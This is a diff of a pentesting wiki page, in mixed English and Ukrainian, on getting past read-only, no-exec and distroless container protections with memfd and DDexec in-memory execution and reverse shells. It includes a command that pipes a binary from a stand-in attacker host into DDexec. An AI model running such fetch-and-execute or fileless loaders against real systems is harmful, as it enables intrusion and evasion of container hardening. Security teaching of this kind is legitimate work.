@@ -1,8 +1,8 @@
 # Bypass FS protections: read-only / no-exec / Distroless
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -15,9 +15,9 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_вимагається вільне володіння польською мовою в усній та письмовій формі_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -30,7 +30,7 @@ In the following videos you can find the techniques mentioned in this page expla
 
 ## read-only / no-exec scenario
 
-Все частіше можна зустріти linux-машини, змонтовані з **захистом файлової системи тільки для читання (ro)**, особливо в контейнерах. Це пов'язано з тим, що запустити контейнер з файловою системою ro так само просто, як встановити **`readOnlyRootFilesystem: true`** в `securitycontext`:
+It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -45,42 +45,42 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-Однак, навіть якщо файлова система змонтована як ro, **`/dev/shm`** все ще буде записуваним, тому це неправда, що ми не можемо нічого записати на диск. Однак, ця папка буде **змонтована з захистом no-exec**, тому якщо ви завантажите бінарний файл сюди, ви **не зможете його виконати**.
+However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.
 
 {% hint style="warning" %}
-З точки зору червоної команди, це ускладнює **завантаження та виконання** бінарних файлів, які вже не знаходяться в системі (як бекдори або енумератори, такі як `kubectl`).
+From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
 {% endhint %}
 
 ## Easiest bypass: Scripts
 
-Зверніть увагу, що я згадував бінарні файли, ви можете **виконувати будь-який скрипт**, якщо інтерпретатор знаходиться всередині машини, наприклад, **shell-скрипт**, якщо `sh` присутній, або **python** **скрипт**, якщо `python` встановлений.
+Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.
 
-Однак цього недостатньо, щоб виконати ваш бінарний бекдор або інші бінарні інструменти, які вам можуть знадобитися.
+However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.
 
 ## Memory Bypasses
 
-Якщо ви хочете виконати бінарний файл, але файлова система цього не дозволяє, найкращий спосіб зробити це - **виконати його з пам'яті**, оскільки **захисти не застосовуються там**.
+If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.
 
 ### FD + exec syscall bypass
 
-Якщо у вас є потужні скриптові движки всередині машини, такі як **Python**, **Perl** або **Ruby**, ви можете завантажити бінарний файл для виконання з пам'яті, зберегти його в дескрипторі пам'яті (`create_memfd` syscall), який не буде захищений цими захистами, а потім викликати **`exec` syscall**, вказуючи **fd як файл для виконання**.
+If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.
 
-Для цього ви можете легко використовувати проект [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Ви можете передати йому бінарний файл, і він згенерує скрипт у вказаній мові з **бінарним файлом, стиснутим і закодованим в b64** з інструкціями для **декодування та розпакування його** в **fd**, створеному за допомогою виклику `create_memfd` syscall, і викликом **exec** syscall для його виконання.
+For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.
 
 {% hint style="warning" %}
-Це не працює в інших скриптових мовах, таких як PHP або Node, оскільки у них немає жодного **за замовчуванням способу викликати сирі системні виклики** з скрипту, тому неможливо викликати `create_memfd`, щоб створити **дескриптор пам'яті** для зберігання бінарного файлу.
+This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
 
-Більше того, створення **звичайного дескриптора** з файлом у `/dev/shm` не спрацює, оскільки вам не дозволять його виконати через те, що **захист no-exec** буде застосований.
+Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) - це техніка, яка дозволяє вам **модифікувати пам'ять вашого власного процесу** шляхом перезапису його **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.
 
-Отже, **контролюючи асемблерний код**, який виконується процесом, ви можете написати **shellcode** і "мутувати" процес, щоб **виконати будь-який довільний код**.
+Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.
 
 {% hint style="success" %}
-**DDexec / EverythingExec** дозволить вам завантажити та **виконати** ваш власний **shellcode** або **будь-який бінарний файл** з **пам'яті**.
+**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
 {% endhint %}
 ```bash
 # Basic example
@@ -106,7 +106,7 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 ### Що таке distroless
 
-Контейнери distroless містять лише **найнеобхідні компоненти для запуску конкретного застосунку або служби**, такі як бібліотеки та залежності часу виконання, але виключають більші компоненти, такі як менеджер пакетів, оболонка або системні утиліти.
+Контейнери distroless містять лише **найнеобхідні компоненти для запуску конкретного застосунку або служби**, такі як бібліотеки та залежності виконання, але виключають більші компоненти, такі як менеджер пакетів, оболонка або системні утиліти.
 
 Мета контейнерів distroless полягає в тому, щоб **зменшити поверхню атаки контейнерів, усунувши непотрібні компоненти** та мінімізуючи кількість вразливостей, які можуть бути використані.
 
@@ -118,29 +118,29 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 Отже, ви **не зможете** отримати **реверс-шел** або **перерахувати** систему, як зазвичай.
 {% endhint %}
 
-Однак, якщо скомпрометований контейнер, наприклад, запускає flask web, тоді python встановлений, і тому ви можете отримати **Python реверс-шел**. Якщо він запускає node, ви можете отримати Node rev shell, і те ж саме з більшістю будь-якої **скриптової мови**.
+Однак, якщо скомпрометований контейнер, наприклад, запускає flask web, тоді python встановлений, і тому ви можете отримати **Python реверс-шел**. Якщо він запускає node, ви можете отримати Node rev shell, і те ж саме з більшістю будь-яких **скриптових мов**.
 
 {% hint style="success" %}
 Використовуючи скриптову мову, ви могли б **перерахувати систему**, використовуючи можливості мови.
 {% endhint %}
 
-Якщо немає **захистів `read-only/no-exec`**, ви могли б зловживати своїм реверс-шелом, щоб **записати у файлову систему свої бінарні файли** та **виконати** їх.
+Якщо немає **захистів `read-only/no-exec`**, ви могли б зловживати своїм реверс-шелом, щоб **записувати у файлову систему свої бінарні файли** та **виконувати** їх.
 
 {% hint style="success" %}
 Однак у таких контейнерах ці захисти зазвичай існують, але ви могли б використовувати **попередні техніки виконання в пам'яті, щоб обійти їх**.
 {% endhint %}
 
-Ви можете знайти **приклади** того, як **експлуатувати деякі вразливості RCE**, щоб отримати реверс-шели скриптових мов та виконати бінарні файли з пам'яті за адресою [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Ви можете знайти **приклади** того, як **використовувати деякі вразливості RCE**, щоб отримати реверс-шели скриптових мов та виконувати бінарні файли з пам'яті за адресою [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Якщо вас цікавить **кар'єра в хакерстві** і ви хочете зламати незламне - **ми наймаємо!** (_вимагається вільне володіння польською мовою в письмовій та усній формі_).
+Якщо вас цікавить **кар'єра в хакерстві** та зламати незламне - **ми наймаємо!** (_вимагається вільне володіння польською мовою в письмовій та усній формі_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 {% hint style="success" %}
-Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вивчайте та практикуйте AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
